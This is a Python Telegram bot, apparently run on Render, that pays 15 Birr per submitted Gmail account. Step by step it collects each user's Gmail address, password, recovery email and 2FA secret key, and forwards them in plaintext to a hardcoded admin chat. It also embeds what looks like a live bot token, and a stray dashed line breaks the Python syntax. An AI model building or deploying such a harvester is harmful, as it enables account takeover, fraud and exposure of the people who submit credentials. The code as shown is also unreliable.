import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# --- STEP 1: MINI WEB SERVER TO KEEP RENDER AWAKE ---
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is alive and running!")

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), SimpleHandler)
    server.serve_forever()

# Start the web server in a separate background thread
threading.Thread(target=run_web_server, daemon=True).start()
---------------------------------------------------

# Conversation states
EMAIL, PASSWORD, RECOVERY_EMAIL, TWO_FACTOR_KEY, TELEBIRR = range(5)

# Start Command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reply_keyboard = [
        ["📤 Submit Account (15 Birr)"],
        ["💬 Help", "🤖 My Bot"]
    ]
    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
    
    welcome_text = (
        "👋 **Welcome to Gmail Submission Bot!**\n\n"
        "✨ **Payout Rate:** **15 Birr** per approved account.\n\n"
        "Click the button below to submit your account details:"
    )
    
    await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=markup)

# Step 1: Start submission process
async def submit_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    markup = ReplyKeyboardMarkup([["❌ Cancel"]], resize_keyboard=True)
    await update.message.reply_text(
        "📧 Please enter your Gmail email address:",
        parse_mode="Markdown",
        reply_markup=markup
    )
    return EMAIL

async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == "❌ Cancel":
        return await cancel(update, context)
    context.user_data['email'] = text
    markup = ReplyKeyboardMarkup([["❌ Cancel"]], resize_keyboard=True)
    await update.message.reply_text("🔒 Please enter your password:", reply_markup=markup)
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == "❌ Cancel":
        return await cancel(update, context)
    context.user_data['password'] = text
    markup = ReplyKeyboardMarkup([["❌ Cancel"]], resize_keyboard=True)
    await update.message.reply_text("📬 Please enter your recovery email address:", reply_markup=markup)
    return RECOVERY_EMAIL

async def get_recovery_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == "❌ Cancel":
        return await cancel(update, context)
    context.user_data['recovery_email'] = text
    reply_keyboard = [
        ["🔑 Add 2FA key", "⏩ Skip 2FA"],
        ["❌ Cancel"]
    ]
    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "🔐 Would you like to add a 2FA secret key or skip to final payout?",
        reply_markup=markup
    )
    return TWO_FACTOR_KEY

async def handle_2fa_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == "❌ Cancel":
        return await cancel(update, context)
    if text == "🔑 Add 2FA key":
        markup = ReplyKeyboardMarkup([["❌ Cancel"]], resize_keyboard=True)
        await update.message.reply_text("⌨️ Please type your 2FA secret key:", reply_markup=markup)
        return TWO_FACTOR_KEY
    else:
        context.user_data['2fa'] = "Skipped / None"
        markup = ReplyKeyboardMarkup([["❌ Cancel"]], resize_keyboard=True)
        await update.message.reply_text("💰 Please enter your Telebirr account name/number for payout:", reply_markup=markup)
        return TELEBIRR

async def get_2fa_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == "❌ Cancel":
        return await cancel(update, context)
    context.user_data['2fa'] = text
    markup = ReplyKeyboardMarkup([["❌ Cancel"]], resize_keyboard=True)
    await update.message.reply_text("💰 Please enter your Telebirr account name/number for payout:", reply_markup=markup)
    return TELEBIRR

async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == "❌ Cancel":
        return await cancel(update, context)
        
    telebirr_info = text
    email = context.user_data.get('email')
    password = context.user_data.get('password')
    recovery = context.user_data.get('recovery_email')
    two_fa = context.user_data.get('2fa', 'N/A')
    
    user = update.effective_user
    my_admin_id = 2103337926  # Your Admin ID
    
    admin_message = (
        f"🚨 **NEW ACCOUNT SUBMISSION** 🚨\n\n"
        f"👤 **User Name:** {user.first_name}\n"
        f"🆔 **User ID:** `{user.id}`\n"
        f"🔗 **Username:** @{user.username if user.username else 'None'}\n\n"
        f"📧 **Gmail:** {email}\n"
        f"🔑 **Password:** {password}\n"
        f"📬 **Recovery:** {recovery}\n"
        f"🛡️ **2FA Key:** {two_fa}\n"
        f"💰 **Telebirr:** {telebirr_info}"
    )
    
    await context.bot.send_message(chat_id=my_admin_id, text=admin_message, parse_mode="Markdown")
    context.user_data.clear()

    reply_keyboard = [
        ["📤 Submit Account (15 Birr)"],
        ["💬 Help", "🤖 My Bot"]
    ]
    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "✅ Submission received successfully! Pending verification for your **15 Birr** payout.",
        parse_mode="Markdown",
        reply_markup=markup
    )
    return ConversationHandler.END

async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💬 **Help & Support:**\nContact the admin if you experience any issues receiving your 15 Birr payout.")

async def my_bot_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 This bot processes and forwards account submissions directly to the administrator.")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    reply_keyboard = [
        ["📤 Submit Account (15 Birr)"],
        ["💬 Help", "🤖 My Bot"]
    ]
    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
    await update.message.reply_text("❌ Submission canceled.", reply_markup=markup)
    return ConversationHandler.END

if __name__ == '__main__':
    BOT_TOKEN = os.getenv("BOT_TOKEN", "8941199738:AAFs0IivEoEecPtmheF-bK5KZ3wqOGQreHo")
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^📤 Submit Account \(15 Birr\)$"), submit_start)],
        states={
            EMAIL: [MessageHandler(filters.Regex("^❌ Cancel$"), cancel), MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
            PASSWORD: [MessageHandler(filters.Regex("^❌ Cancel$"), cancel), MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            RECOVERY_EMAIL: [MessageHandler(filters.Regex("^❌ Cancel$"), cancel), MessageHandler(filters.TEXT & ~filters.COMMAND, get_recovery_email)],
            TWO_FACTOR_KEY: [
                MessageHandler(filters.Regex("^🔑 Add 2FA key$"), handle_2fa_choice),
                MessageHandler(filters.Regex("^⏩ Skip 2FA$"), handle_2fa_choice),
                MessageHandler(filters.Regex("^❌ Cancel$"), cancel),
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa_key)
            ],
            TELEBIRR: [MessageHandler(filters.Regex("^❌ Cancel$"), cancel), MessageHandler(filters.TEXT & ~filters.COMMAND, get_telebirr)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(MessageHandler(filters.Regex("^💬 Help$"), help_handler))
    app.add_handler(MessageHandler(filters.Regex("^🤖 My Bot$"), my_bot_handler))

    print("Bot and web server are running...")
    app.run_polling()
